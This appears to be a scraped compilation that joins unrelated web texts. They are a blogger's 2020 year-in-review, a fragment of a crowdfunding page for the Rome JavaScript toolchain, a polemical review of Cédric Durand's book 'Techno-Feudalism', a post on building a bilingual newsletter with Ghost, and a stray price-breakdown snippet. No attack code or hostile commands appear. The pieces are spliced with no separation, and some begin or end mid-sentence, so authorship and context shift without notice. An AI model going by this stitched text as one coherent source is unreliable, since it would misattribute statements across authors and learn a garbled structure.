<p>One of my personal goals for 2020 was to release one side project. While contemplating ideas I stumbled upon an article which highlighted why you should start ideas out of your core domain. So I dismissed my half-baked SaaS ideas and went for a no-code idea instead: Start a blog. If you just came for the stats you can <a href="#stats">scroll to the bottom</a>. If you’re in for the recap just read on.</p>



<h2>Just ship it</h2>



<p>My first article went online on January 29. Pretty early to meet one of my yearly goals I must admit. I can assure you I managed to miss many other low hanging fruits like running a sub 3 marathon. However, I did manage to release 22 more blog posts which makes up for that a bit.</p>



<figure><img src="https://andreschweighofer.com/wp-content/uploads/2020/12/stepbystep-1024x546.jpg" alt="" srcset="https://andreschweighofer.com/wp-content/uploads/2020/12/stepbystep-1024x546.jpg 1024w, https://andreschweighofer.com/wp-content/uploads/2020/12/stepbystep-300x160.jpg 300w, https://andreschweighofer.com/wp-content/uploads/2020/12/stepbystep-768x410.jpg 768w, https://andreschweighofer.com/wp-content/uploads/2020/12/stepbystep.jpg 1200w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>The first “hit” I had was <a href="https://www.runtastic.com/blog/en/no-more-estimates/">an article released for my employer</a>, Runtastic about #noEstimates. It was recognised by some big names I look up to like Allen Holub. I was also invited to a podcast. This was all still in the first quarter of the year. The positive responses were fuel to the fire of my writing.</p>



<h2>Five minutes of fame</h2>



<p>My blog still averaged less than 10 daily visitors. I experimented with different kinds of articles, like my <a href="https://andreschweighofer.com/today-i-learned/my-tils-of-the-week-14-20/">TILs of the week</a>. Then I hit the next golden nugget. <a href="https://andreschweighofer.com/agile/anxiety-in-product-development/">Anxiety in product development</a> made it to the #1 spot on HackerNews for a full day. This generated about 40.000 page views which to this day is about 90% of my total page views in the year. But this was much more personal. I’m an avid HackerNews reader since my early days of university. That’s now almost 10 years ago. It feels like my first (and only) StackOverflow gold badge.</p>



<p>It also came with an even bigger lesson: Be less judgmental about your writing. I was not planning to publish the article at first because I thought it was too weak. It gets me wondering how many of my self-censored articles would’ve been perceived positively as well.</p>



<h2>The speech</h2>



<p>My next two articles about <a href="https://andreschweighofer.com/agile/crafting-a-lean-roadmap/">lean roadmaps</a> had a wide reach since they were featured in some newsletters. After that my writing slowed down considerably because I was preparing for my first ever conference talk. At the Lean Agile Exchange I shared my team’s experience with #noEstimates. While it did not make me famous (not as famous as the HackerNews front page anyway) it really pushed me out of my comfort zone and made me hone some new skills. I’m definitely planning to look for another speaking opportunity next year, maybe <a href="https://andreschweighofer.com/tech/technical-debt-is-an-organisational-dysfunction/">about technical debt</a>.</p>



<h2>My lessons learned</h2>



<p>It was a year of many firsts. Those brought a lot of learning opportunities for me.</p>



<h3>A viscious learning cycle</h3>



<p>You think you got your ideas straight until you write them down. While writing you find inconsistencies and holes in the story. This lead me to read more than I ever did. The more I read the more I wanted to write about ideas I had while reading. That’s why I can’t leave the most influental books for me unmentioned.</p>



<ul><li><a href="https://www.amazon.com/gp/product/2960133552/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=2960133552&amp;linkCode=as2&amp;tag=andre0d6f-20&amp;linkId=8b675f3ba120ae8f5e3edff39608cabe">Reinventing Organisations</a> – This book had the biggest impact on me because I found the <em>Integral Theory</em> applicable to all aspect of my life – work, parenting, thinking. Here’s one of my favourite quotes from the book:</li></ul>



<blockquote><p>Our underlying management paradigm today is based on trying to predict and control. And the challenge with that: it often gives us more illusion of control than real control.</p></blockquote>



<ul><li><a href="https://www.amazon.com/gp/product/1984877860/ref=as_li_tl?ie=UTF8&amp;tag=andre0d6f-20&amp;camp=1789&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=1984877860&amp;linkId=0c6997a715595b76b3a7397405d06f7c"></a><a rel="noreferrer noopener" target="_blank" href="https://www.amazon.com/gp/product/1984877860?ie=UTF8&amp;tag=andre0d6f-20&amp;camp=1789&amp;linkCode=xm2&amp;creativeASIN=1984877860">No Rules Rules: Netflix and the Culture of Reinvention</a> – A captivating read about Netflix’s polarising but very successful culture. Their thoughtful approach to giving and receiving feedback and how they value people over processes was interesting.</li><li><a rel="noreferrer noopener" target="_blank" href="https://www.amazon.com/gp/product/1603580557?ie=UTF8&amp;tag=andre0d6f-20&amp;camp=1789&amp;linkCode=xm2&amp;creativeASIN=1603580557">Thinking in Systems: A Primer</a> – While this was really not more than a basic introduction to systems thinking I enjoyed the more opinionated second half of the book. Here’s a quote to give you a taste:</li></ul>



<p><em>“It requires freedom and experimentation, and a certain amount of disorder. These conditions that encourage self-organization often can be scary for individuals and threatening to power structures. As a consequence, education systems may restrict the creative powers of children instead of stimulating those powers. Economic policies may lean toward supporting established, powerful enterprises rather than upstart, new ones. And many governments prefer their people not to be too self-organizing.”</em></p>



<ul><li><a rel="noreferrer noopener" target="_blank" href="https://www.amazon.com/gp/product/3903205397?ie=UTF8&amp;tag=andre0d6f-20&amp;camp=1789&amp;linkCode=xm2&amp;creativeASIN=3903205397">Rethinking Agile: Why Agile Teams Have Nothing To Do With Business Agility</a> Do your organisation’s high-level goals feel completely disconnected from your daily work? Then you should read this book to see that it can be different.</li></ul>



<h2>Finding your voice</h2>



<p>It’s incredibly hard to find your own voice. I think I still haven’t found it. I would like to <a href="https://mango.pdf.zone/finding-former-australian-prime-minister-tony-abbotts-passport-number-on-instagram">write like MangoPDF</a> but am afraid of sounding like an idiot or losing non-native audiences. With my current rate I can’t afford to lose any visitors really.</p>



<p>Ultimately the most important thing for me is to get the idea across, not to be perceived as witty. I still feel vulnerable publishing and promoting my own writing and I am somewhat held back by exposing my full self. How do you find a balance between writing what is interesting to others and what you want to say?</p>



<h2>The joy of writing</h2>



<p>I rediscovered something I didn’t even remember I lost. I love writing. As a child I spent hours in my room writing fiction even though there was a Nintendo competing for my attention. However, being laughed at while presenting my work made that 9 year old simply stop writing. It only came back to me once I did pick up writing again how much I enjoyed the act in itself. Every word I publish still fights this criticism. It also gave me a profound reminder of how sensitive I want to be with my children’s creativity.</p>



<h2 id="stats">The raw data</h2>



<p>If you’re just curious how this blog did, here are my numbers:</p>



<ul><li>I published in total 22 articles</li><li>I generated just above 43.000 <em>pageviews.</em> 90% of that were from HackerNews with <a href="https://andreschweighofer.com/agile/anxiety-in-product-development/">Anxiety in product development</a>.</li><li>The <em>average</em> <em>time on page</em> is just short of 4 minutes. I love that fact because it means people actually read my stuff.</li><li>I had 8.000 search impressions with 136 clicks with an average search position of 22. My best performing SEO article is: <a href="https://andreschweighofer.com/tech/how-to-measure-technical-debt/">How to measure technical debt</a>.</li></ul>



<h2>An outlook for 2021</h2>



<p>I definitely want to continue to write. The plan is to use some of that as the basis for a conference talk. At the same time I want to continue doing the Experiential Agile podcast with Mel. I will start a new role as Engineering Manager early next year which could either fuel my writing with new ideas and problems but it could also take time and energy away from my writing. We will see.</p>

These tools have both inspired me to create Rome, a new project that aims to simplify and improve JavaScript and web development.</p> <p>Rome consolidates dozens of separate tools into one. Rome can install your dependencies, check your code for errors, run your tests, bundle your code, and more, all via a single CLI. Rome will be able to replace Babel, ESLint, Prettier, Yarn, and webpack. <a href="https://rome.tools/">Learn more</a>.</p> <p>It’s been three months since we announced our initial <a href="https://rome.tools/blog/2020/08/08/introducing-rome.html">beta release</a>. Since then, we’ve received a tremendous amount of enthusiasm from the community. As that enthusiasm has grown, it’s become clear that Rome will require a full-time developer to be successful and deliver on our ambitious goals and release a stable v1.0.</p> <p><strong>I need your help to make it a reality.</strong></p> </section> <section> <h2 id="funding">Funding <a href="#funding" aria-label="funding"></a></h2> <p>I have left my job so I can work independently and focus on what the community needs. This includes a <a href="#allow-users-to-extend-functionality-with-plugins">plugin system</a>, <a href="#add-more-configuration-and-have-less-opinions">more configuration</a>, and <a href="#integrate-with-existing-tools">dedicated integrations for existing tools</a>.</p> <p>We have an initial goal of <strong>$100,000</strong>. This will allow myself to work independently on our first stable release. Additional funding would allow us to expand upon our release goals, fund future maintenance, and compensate other contributors.</p> <p>If you’re passionate about what we’re building, or have otherwise benefited from my work, I would appreciate your financial support.</p>    <section> <h3 id="recent-contributions">Recent Contributions <a href="#recent-contributions" aria-label="recent-contributions"></a></h3> <ul> <li>Loading...</li> </ul> </section> <section> <h3 id="contribute">Contribute <a href="#contribute" aria-label="contribute"></a></h3> <p>Prices are in USD.

I’ll make sure Rome works well for you and your organization.</p> <p>Migration support is where I personally help your organization adopt and use Rome.

We can make Rome easier to use and work for more people.</p> <section> <h3 id="add-more-configuration-and-have-less-opinions">Add more configuration and have less opinions <a href="#add-more-configuration-and-have-less-opinions" aria-label="add-more-configuration-and-have-less-opinions"></a></h3> <p>We have deliberately tried to keep configuration to a minimum. While this does produce a minimal API surface, it makes it almost impossible to easily migrate without losing functionality or changing conventions.</p> <p>We should aim to reduce the functional differences between Rome and other tools by introducing additional configuration and supported languages. This could include:</p> <ul> <li>Code formatting options</li> <li>Ability to customize expected filenames and directories</li> <li>Support for other configuration languages such as YAML and TOML</li> <li>More CLI flags</li> <li>Public JavaScript API</li> <li>Dynamic configuration (as opposed to static JSON-only configuration files)</li> <li><a href="#allow-users-to-extend-functionality-with-plugins">Allow extending functionality with plugins</a></li> </ul> <p>We have so far kept configuration light, as by reducing the amount of configuration options supported, we reduce maintenance cost and the potential for internal bugs.</p> <p>While this makes it easier for us as maintainers, it makes it drastically more difficult for users. No matter how persuasive our arguments may be for why you should use hard tabs instead of spaces, they seem like artificial and arbitrary constraints and introduces excessive prerequisites for adoption.</p> <p>Strong defaults and guided documentation for new users can provide the experience we ultimately want to offer, while removing our existing adoption restrictions.</p> </section> <section> <h3 id="integrate-with-existing-tools">Integrate with existing tools <a href="#integrate-with-existing-tools" aria-label="integrate-with-existing-tools"></a></h3> <p>Rome attempts to replace many tools. However we should still strive to support scenarios where another tool is better situated or preferred. This can also help during a migration where Rome is used in conjunction with another tool. We can do this in a couple of ways:</p> <p><strong>Integrating Rome as a first-class plugin in tools such as Babel, eslint, and webpack</strong></p> <p>Rome could be exposed as a plugin for those tools to allow you to adopt the Rome compiler without having to adopt the bundler first. This would reduce adoption prerequisites and allow easier experimentation inside of existing setups.</p> <p><strong>Seamlessly integrate other tools into Rome</strong></p> <p>We can introduce compatibility layers to have ESLint, Babel, and other tools run inside of Rome itself. ESLint errors could be displayed alongside Rome linter errors with the same UI and output format Instantly you could benefit from Rome’s file caching and parallelisation without needing a major migration.</p> </section> <section> <h3 id="assist-in-migrating-from-existing-tools">Assist in migrating from existing tools <a href="#assist-in-migrating-from-existing-tools" aria-label="assist-in-migrating-from-existing-tools"></a></h3> <p>It should be easy to migrate from other tools to Rome. First we need to ensure popular configuration options from other tools are supported. Then, offer automated tools to migrate basic setups without users needing to it manually.</p> <p>This needs to be accompanied with dedicated documentation and guides that can explain the differences between the tools, why you might want to use one over the other, similar concepts, new terminology, and equivalent config options.</p> </section> <section> <h3 id="allow-users-to-extend-functionality-with-plugins">Allow users to extend functionality with plugins <a href="#allow-users-to-extend-functionality-with-plugins" aria-label="allow-users-to-extend-functionality-with-plugins"></a></h3> <p>One of the fears with Rome is creating a monoculture where it’s impossible to innovate and experiment with new ideas. While it’s extremely optimistic to think we’ll ever get into any sort of monopolistic position, not allowing extensions does stiffle innovation regardless of our market position by restricting the viability and adoption of new ideas.</p> <p>Plugins allow us to avoid supporting functionality that we might not want, while still giving users a choice. It reduces our role as an arbiter and allows new languages, non-standard JavaScript features, code conventions, and ideas that interact with Rome to be viable, receive support, and proliferate.</p> <p>We need to be extremely careful not to get into the position where Babel and Webpack are today, where they’re heavily restricted by the usage of internal APIs. We need to be able to maintain our autonomy when it comes to making architectural changes. Balancing this with a powerful plugin API will be a challenge and will likely require several iterations.</p> </section> <section> <h3 id="release-undocumented-features">Release undocumented features <a href="#release-undocumented-features" aria-label="release-undocumented-features"></a></h3> <p>Rome currently does a lot more than linting. It’s a major challenge today to market and explain Rome when so much of the project isn’t officially supported. While we strive to make each individual component of Rome competitive on it’s own, to some the biggest advantage and compelling reason for using Rome might be the reduction in dependencies.</p> <p>We should focus on releasing and maturing basic versions of all core functionality. This would increase user confidence in our architecture and show that Rome is viable as the comprehensive replacement that we want to be.</p> </section> <section> <h3 id="provide-accessible-and-comprehensive-documentation">Provide accessible and comprehensive documentation <a href="#provide-accessible-and-comprehensive-documentation" aria-label="provide-accessible-and-comprehensive-documentation"></a></h3> <p>Documentation for developer tools is generally quite obtuse and relies a lot on prerequisite knowledge. This can make it intimidating and inaccessible for developers new to the ecosystem. Further complicating that is the broad scope of what Rome is trying to do.</p> <p>We have tried to address some of this by making our documentation a single page. This makes it easy to search, and it can be read from top to bottom without needing to jump around to learn about different concepts. However as our supported features grow, it will be more difficult to use this structure without oversimplifcation and doesn’t allow different paths for different demographics.</p> <p>We need to invest in a more scalable approach for our documentation. We can offer dedicated sections that explain features like linting end-to-end without needing to introduce other components like the compiler and bundler that contain significantly more concepts and overwhelm the reader. Separate guides can be offered for new users and those already experienced with other tools to properly cater for multiple audiences.</p> </section> <section> <h3 id="regularly-release-new-versions">Regularly release new versions <a href="#regularly-release-new-versions" aria-label="regularly-release-new-versions"></a></h3> <p>One of the reasons Babel was successful is how quickly I was able to quickly fix bugs and release new versions. I would regularly have releases out within minutes of a bug report. This was critical during the early days when adoption was low. Being able to unblock users quickly would often make them more excited to use Babel even though they ran into a bug.</p> <p>Similarly, we should try and replicate this by building out our release infrastructure to allow the rapid testing and release of versions. We need to maintain momentum as the scope of supported features grow.</p> <p>We can achieve this with automated releases that can be manually triggered or deployed on a schedule. Automatic changelog generation would also take a lot of the manual work out of producing releases. Nightly releases would allow users to test experimental features and provide early feedback.</p> </section> </section> <section> <h2 id="questions-and-answers">Questions and Answers <a href="#questions-and-answers" aria-label="questions-and-answers"></a></h2> <section> <h3 id="when-will-physical-rewards-be-shipped">When will physical rewards be shipped? <a href="#when-will-physical-rewards-be-shipped" aria-label="when-will-physical-rewards-be-shipped"></a></h3> <p>We are tentatively aiming for the end of April 2021, however due to COVID delays or order volume this could be extended.

<p>The political economy of the Digital Age remains virtually terra incognita. In <a href="https://www.amazon.com/Technof%C3%A9odalisme-French-C%C3%A9dric-DURAND-ebook/dp/B08GS8XV47/ref=pd_ybh_a_2?_encoding=UTF8&amp;psc=1&amp;refRID=ZCPCTPFZXYQBGGRPBDH3">Techno-Feudalism</a>, published three months ago in France (no English translation yet), <strong>Cedric Durand,</strong> an economist at the Sorbonne, provides a crucial, global public service as he sifts through the new Matrix that controls all our lives.</p>
<p>Durand places the Digital Age in the larger context of the historical evolution of capitalism to show how the Washington consensus ended up metastasized into the Silicon Valley consensus. In a delightful twist, he brands the new grove as the “Californian ideology”.</p>
<p>We’re far away from Jefferson Airplane and the Beach Boys; it’s more like Schumpeter’s “creative destruction” on steroids, complete with IMF-style “structural reforms” emphasizing “flexibilization” of work and  outright marketization/financialization of everyday life.</p>
<p>The Digital Age was crucially associated with right-wing ideology from the very start. The incubation was provided by the <a href="http://www.pff.org/">Progress and Freedom Foundation (PFF)</a>, active from 1993 to 2010 and conveniently funded, among others, by Microsoft, At&amp;T, Disney, Sony, Oracle, Google and Yahoo.</p>
<p>In 1994, PFF held a ground-breaking conference in Atlanta that eventually led to a seminal Magna Carta: literally, <a href="https://www.goodreads.com/book/show/39342741-cyberspace-and-the-american-dream">Cyberspace and the American Dream: a Magna Carta for the Knowledge Era</a>, published in 1996, during the first Clinton term.</p>
<p>Not by accident the magazine <a href="https://www.wired.com/">Wired </a>was founded, just like PFF, in 1993, instantly becoming the house organ of the “Californian ideology”.</p>
<p>Among the authors of the Magna Carta we find futurist <a href="https://www.tofflerassociates.com/about/the-toffler-legacy/">Alvin “Future Shock” Toffler</a> and Reagan’s former scientific counselor George Keyworth. Before anyone else, they were already conceptualizing how “cyberspace is a bioelectronic environment which is literally universal”. Their Magna Carta was the privileged road map to explore the new frontier.</p>
<p><strong>Those Randian heroes</strong></p>
<p>Also not by accident the intellectual guru of the new frontier was Ayn Rand and her quite primitive dichotomy between “pioneers” and the mob. Rand declared that egotism is good, altruism is evil, and empathy is irrational.</p>
<p>When it comes to the new property rights of the new Eldorado, all power should be exercised by the Silicon Valley “pioneers”, a Narcissus bunch in love with their mirror image as superior Randian heroes. In the name of innovation they should be allowed to destroy any established rules, in a Schumpeterian “creative destruction” rampage.</p>
<p>That has led to our current environment, where Google, Facebook, Uber and co. can overstep any legal framework, imposing their innovations like a <em>fait accompli</em>.</p>
<p>Durand goes to the heart of the matter when it comes to the true nature of “digital domination”: US leadership was never achieved because of spontaneous market forces.</p>
<p>On the contrary. The history of Silicon Valley is absolutely dependent on state intervention – especially via the industrial-military complex and the aero-spatial complex. The Ames Research Center, one of NASA’s top labs, is in Mountain View. Stanford was always awarded juicy military research contracts. During WWII, Hewlett Packard, for instance, was flourishing thanks to their electronics being used to manufacture radars. Throughout the 1960s, the US military bought the bulk of the still infant semiconductor production.</p>
<p><a href="https://www.technologyreview.com/2016/03/21/161487/the-rise-of-data-capital/"><em>The Rise of Data Capital</em></a><em>, </em>a 2016 MIT Technological Review report produced “in partnership” with Oracle, showed how digital networks open access to a new, virgin underground brimming with resources: “Those that arrive first and take control obtain the resources they’re seeking” – in the form of data.</p>
<p>So everything from video-surveillance images and electronic banking to DNA samples and supermarket tickets implies some form of territorial appropriation. Here we see in all its glory the extractivist logic inbuilt in the development of Big Data.</p>
<p>Durand gives us the example of Android to illustrate the extractivist logic in action. Google made Android free for all smartphones so it would acquire a strategic market position, beating the Apple ecosystem and thus becoming the default internet entry point for virtually the whole planet. That’s how a de facto, immensely valuable,  online real estate empire is built.</p>
<p>The key point is that whatever the original business – Google, Amazon, Uber – strategies of conquering cyberspace all point to the same target: take control of “spaces of observation and capture” of data.</p>
<p><strong>About the Chinese credit system…</strong></p>
<p>Durand offers a finely balanced analysis of the Chinese credit system – a public/private hybrid system launched in 2013 during the 3<sup>rd</sup> plenum of the 18<sup>th</sup> Congress of the CCP, under the motto “to value sincerity and punish insincerity”.</p>
<p>For the State Council, the supreme government authority in China, what really mattered was to encourage behavior deemed responsible in the financial, economic and socio-political spheres, and sanction what is not. It’s all about trust. Beijing defines it as “a method of perfecting the socialist market economy system that improves social governance”.</p>
<p>The Chinese term – <em>shehui xinyong</em> – is totally lost in translation in the West. Way more complex than “social credit”, it’s more about  “trustworthiness”, in the sense of integrity. Instead of the pedestrian Western accusations of being an Orwellian system, priorities include the fight against fraud and corruption at the national, regional and local levels, violations of environmental rules, disrespect of food security norms.</p>
<p>Cybernetic management of social life is being seriously discussed in China since the 1980s. In fact, since the 1940s, as we see in Mao’s <em>Little Red Book</em>. It could be seen as inspired by the Maoist principle of “mass lines”, as in “start with the masses to come back to the masses: to amass the ideas of the masses (which are dispersed, non-systematic), concentrate them (in general ideas and systematic), then come back to the masses to diffuse and explain them, make sure the masses assimilate them and translate them into action, and verify in the action of the masses the pertinence of these ideas”.</p>
<p><strong>Durand’s analysis goes one step beyond Soshana Zuboff’s</strong></p>
<p><em>The Age of Surveillance Capitalism</em> when he finally reaches the core of his thesis, showing how digital platforms become “fiefdoms”: they live out of, and profit from, their vast “digital territory” peopled with data even as they lock in power over their services, which are deemed indispensable.</p>
<p>And just as in feudalism, fiefdoms dominate territory by attaching serfs. Masters made their living profiting from the social power derived from the exploitation of their domain, and that implied unlimited power over the serfs.</p>
<p>It all spells out total concentration. Silicon Valley stalwart Peter Thiel has always stressed the target of the digital entrepreneur is exactly to bypass competition. As quoted in <em>Crashed: How a Decade of Financial Crises Changed the World</em>, Thiel declared, “Capitalism and competition are antagonistic. Competition is for losers.”</p>
<p>So now we are facing not a mere clash between Silicon Valley capitalism and finance capital, but actually a new mode of production:</p>
<p>a turbo-capitalist survival as rentier capitalism, where Silicon giants take the place of estates, and also the State. That is the “techno-feudal” option, as defined by Durand.</p>
<p><strong>Blake meets Burroughs</strong></p>
<p>Durand’s book is extremely relevant to show how the theoretical and political critique of the Digital Age is still rarified. There is no precise cartography of all those dodgy circuits of revenue extraction. No analysis of how do they profit from the financial casino – especially mega investment funds that facilitate hyper-concentration. Or how do they profit from the hardcore exploitation of workers in the gig economy.</p>
<p>The total concentration of the digital glebe is leading to a scenario, as Durand recalls, already dreamed up by Stuart Mill, where every land in a country belonged to a single master. Our generalized dependency on the digital masters seems to be “the cannibal future of liberalism in the age of algorithms”.</p>
<p>Is there a possible way out? The temptation is to go radical – a Blake/Burroughs crossover. We have to expand our scope of comprehension – and stop confusing the map (as shown in the Magna Carta) with the territory (our perception).</p>
<p>William Blake, in his proto-psychedelic visions, was all about liberation and subordination – depicting an authoritarian deity imposing conformity via a sort of source code of mass influence. Looks like a proto-analysis of the Digital Age.</p>
<p>William Burroughs conceptualized Control – an array of manipulations including mass media (he would be horrified by social media). To break down Control, we must be able to hack into and disrupt its core programs. Burroughs showed how all forms of Control must be rejected – and defeated: “Authority figures are seen for what they are:  dead empty masks manipulated by computers”.</p>
<p>Here’s our future: hackers or slaves.</p>

December 7, 2020 | https://interconnected.blog/building-a-bilingual-newsletter-2020-edition/ | <a href="https://web.archive.org/web/*/https://interconnected.blog/building-a-bilingual-newsletter-2020-edition/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="english-version">
                        <p>I’m taking a departure from my usual deep dive analysis to write this “under the hood” exploration of how I’ve been building this bilingual newsletter. I want to share some behind the scenes information, because I’ve always treated Interconnected as a product, not just a blog. Even though it is basically a blog at the moment, there are many things I plan to build on top of this foundation, and sharing the technology, thinking, design, and various experiments is a good way to keep myself honest and learn better in public. I plan to write a similar post like this every year going forward to share and track all the changes, new technologies I try, keep, abandon, as well as product ideas that are constantly floating in my head.</p><p>On another level, I’m motivated to share, because I hope it will help more people produce bilingual content and lubricate the information flow between two languages -- not just the English-Chinese pairing, but any pairing. As <a href="https://interconnected.blog/november-15-2020-16-days/">I noted (perhaps lamented) in my opening letter </a>of last week’s Interconnected Weekly, there’s still so much that needs to be done to improve the information flow between the English and Chinese language world. The 16-days gap between Jack Ma giving his Bund Summit speech and my translating and publishing the speech is too long and too unreliable.</p><h2 id="tech-stack">Tech Stack</h2><p>I use <a href="https://ghost.org/">Ghost</a> as my publishing platform. It is a relatively new platform (started in 2013) that’s completely open sourced, just like its older brethren Wordpress (started in 2003). Ghost is built on the JAM stack (JavaScript, API, Markup), which is a hot and trendy way to build static websites that’s fast and lightweight.</p><p>I chose Ghost because: 1. I’ve had some experience customizing it when launching another blog called <a href="https://coss.media/">COSS Media</a> (writings focused on the commercial open source ecosystem) last year; 2. I like its open source nature (versus its proprietary counterpart Medium), which gives me more control. As many of you know, I’m <a href="https://interconnected.blog/tag/open-source/">quite deep into open source</a> and have written a lot about it, so it’s important to me to “eat my own dog food” too. Ghost also has built-in features for collecting subscribers and designing paid tiers, which I plan to use eventually. Of course, you can do all this in Wordpress too, but it’s typically done via plug-ins that end up bloating the website and degrade load speed -- something I want to avoid in order to give all readers a good experience, wherever they are on our planet. Fast load speed helps with SEO too.</p><figure><img src="https://lh6.googleusercontent.com/eR1dlR-MBmNHWKwYkudnc1AJxqM8m_M0_7GLV5e7oXyd627sL6LhfvViU2eyp5Wy7BPPVAXACBqHlK4LsZnQI5CSGbYAqyU_NLCy4Srz4MRMjnshF0nFh9D9IV6cnZjzL4e80qK3" alt=""></figure><p>It’s not all smooth-sailing with Ghost. Being a young platform, it has plenty of bugs and rooms for improvement. It currently lacks some table stakes features, like email open rate, forwarding tracking, and basic analytics around email interactions with subscribers. I have chosen not to obsess over these metrics for now, because it tends to take my focus away from writing, bad for mental health, and Google Analytics is a sufficient enough substitute. All of these features are on Ghost’s roadmap, so I’m willing to be patient, for now.</p><p>Ghost also has some small issues that are not deal-breakers, just annoying. For example, it has a subscribers dashboard that generates a line chart to show growth (cool!) but there’s a bug that makes the line flat (sad...).</p><figure><img src="https://lh3.googleusercontent.com/2uTlxpvx98QjbQNzYD9loOj0sE1Y9vmc2VeADoV0WqPigviq4-jBhVxyKCqs8r1mKbpw44QF21IaW19F2oITSBkEWxFAgmZOpzOdJhc_pZYwECogVeDIZJ50Bu4yWTaTq9xKBMe3" alt=""></figure><p>This is <a href="https://github.com/TryGhost/Ghost/issues/12083">a known bug and tracked publicly</a> on GitHub, which is standard practice for any open source software. In open source, you can’t hide your problems; you just have to deal with them, in public.</p><p>For my purpose, the best part about using Ghost is its choice of using <a href="https://github.com/handlebars-lang/handlebars.js">Handlebar.js</a> to do its frontend templating and rendering, which is an open source, mature JavaScript framework (first commit was in July 2010). Being open sourced, mature, and a bit boring (instead of new and flashy) is good, because I know there’s enough tutorials out there to help me do customization on my own. If I want something more complicated, I can easily find skilled developers. Going into building Interconnected, I knew providing a good bilingual reading experience would be a challenge, so customizability was key.</p><p>The initial version of Interconnected was an anchor tag hack that I cobbled together where readers who want to read the Chinese version will jump from a link at the top to the halfway point of the page where the Chinese part starts, but can’t jump back. It works but it’s far from ideal. During my research when writing “<a href="https://interconnected.blog/gpt-3-abstraction-of-time-money/">GPT-3: An Abstraction of Time vs Money</a>”, I discovered that OpenAI’s blog has a nice toggle experience <a href="https://openai.com/charter/">between the English and Chinese version of its charter</a>. I already knew that OpenAI uses Ghost to publish content, so the toggle experience could definitely be replicated on Interconnected.</p><figure><img src="https://lh4.googleusercontent.com/eSMGAYhdWSSaDb3YU7mMrRtNtQ3QnQ5r2_AvsaTMBN6SZG-DXX2pyiV-0gTUutqTQhPdk1e0FFYEK0WpFJGcpravCAqWtw2Q0GTCNgfPLDIFAf_Ps2Hm7ySLX5uGSwV-G-OaoohB" alt=""></figure><p>Instead of coding the improvement on my own, I decided to look for help to speed up progress. I ended up hiring a contractor, who is already familiar with Ghost’s various theme templates to do ad-hoc improvements on a project-by-project basis. In addition to building the bilingual toggle, this contractor also built the <a href="https://interconnected.blog/archive/">archive section</a> and many UI improvements to make reading here more effective. The combined cost of these three improvements is less than $200.</p><figure><img src="https://lh6.googleusercontent.com/W2P9fKq30hRq6cs9X9mXzyU3RxxGT9ZkZHVqMem7Cnc22b4dbGfhOYzowWB5ksOS_5uGynKlmRXE72ued4k07_RHrqt5eUDFWWFaJX9rI9XGN50mTsoiSAej6-NQRNs-lOaZyaxv" alt=""></figure><p>Here are some best practices when working with remote contract developers: figure out exactly what you want first, down to the smallest details, before approaching anyone. Using contract developers can be very efficient and cost effective when there is a clear example to replicate, but they are not good (nor should they be) at designing and iterating on half-baked ideas with you. That’s also why, generally speaking, building a startup product with contract developers during its rapid prototyping and discovery phase is a bad idea.</p><p>In other words, contractors are good for cloning, not creating.</p><h2 id="bilingual-writing-process">Bilingual Writing Process</h2><p>I start every post in English first and usually get to a draft that is 85% done before starting on the Chinese version. In the beginning, I used Baidu Translate to turn the 85% done English version into a 50% done Chinese draft, before writing on top of it. I now use <a href="https://www.deepl.com/translator">DeepL</a> for the same purpose. I think DeepL is slightly better than Baidu Translate, but currently don’t have a strong opinion about either one; both work well done.</p><p>The process I apply to the Chinese version is what I call “trans-creating”, a term one of my former colleagues used, which I really like. It’s not a straight-up translation, but a re-creation in a different language. Because I’m the original creator of both, it’s not necessary to stay true to one version or the other -- the goal is to communicate ideas and information in the language they are being conveyed in, properly and naturally.</p><p>For example, the English version may contain certain companies, market concepts, and acronyms related to China that require additional context for the readers to understand, but are obvious for Chinese readers, thus the added background may be omitted in the Chinese version. Certain idioms and humor in the English version simply don’t translate well in Chinese, so the same part may be told in a more straightforward way in the Chinese version.</p><p>One surprising thing I discovered during this twice weekly “trans-creation” process is that writing the Chinese version actually helps improve the English version, because it more effectively exposes imprecisions, inaccuracies, and poorly written passages.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">One surprising thing I discovered from writing bilingually every week is that my Chinese writing process actually helps me improve the English version...by more effectively exposing imprecisions and spotting passages that are poorly explained.</p>— Kevin Xu (@kevinsxu) <a href="https://twitter.com/kevinsxu/status/1321947923555385344?ref_src=twsrc%5Etfw">October 29, 2020</a></blockquote>

</figure><p>Writing is a draining process. Writing bilingually can be extra draining. And when you are drained, dumb mistakes and typos happen. (I loathe typos, because I think it’s the most disrespectful thing a writer can do to a reader.) To shore up quality, I hired an intern a couple of months ago, who is perfectly bilingual (much more so than me) to edit all my writings, plus doing additional research and product development projects. They (not a typo, but the preferred pronoun) also log all my mistakes along with examples of proper usage, so hopefully my own writing will improve over time.</p><p>I have been extra energized and motivated since this intern came on board; their contribution is immediate! I pay them a monthly stipend -- best money I’ve ever spent. (Treat your interns well!)</p><h2 id="future-product-improvements">Future Product Improvements</h2><p>Interconnected, as a product, still has a long way to go. While the English-Chinese toggle has made reading one specific post between the two languages better, the entire website is still more English-centric, which isn’t as friendly to my Chinese reading audience.</p><p>There are many multilingual websites out there, but most of them are corporate sites with limited content -- a form I find ill-suited for consuming long-form writing. There has to be a better design for bilingual and multilingual consumption. (If you have design ideas, please share them with me!)</p><p>Ghost’s built-in email template is also not flexible -- you cannot toggle or easily navigate between the two language versions, which is why I’ve started appending a message at the top of every email to guide my Chinese readers with the best way to consume my posts. (If you received this post via email, you would have seen it.) This is an area where I hope Ghost will offer more customizability. It’ll be the next big improvement I plan to tackle.</p><p>Lastly, I have plans to build more complex offerings on top of this foundation -- a community, a paid layer, a place for more interconnected, interdisciplinary knowledge exchange via multiple mediums, like audio, video, chat, and simulation games. <strong>Interconnected is a 10 year project for me; we are only in the 10th month.</strong></p><p>I hope this “under the hood” post provides some useful information on how to build a bilingual newsletter -- an undertaking entirely doable and replicable by anyone. And I look forward to writing this post again a year from now and share …</p></div></div>

- 16% VAT*:		0,37€
- 30% Apple Fees:	0.58€
-------
💰			1,38€

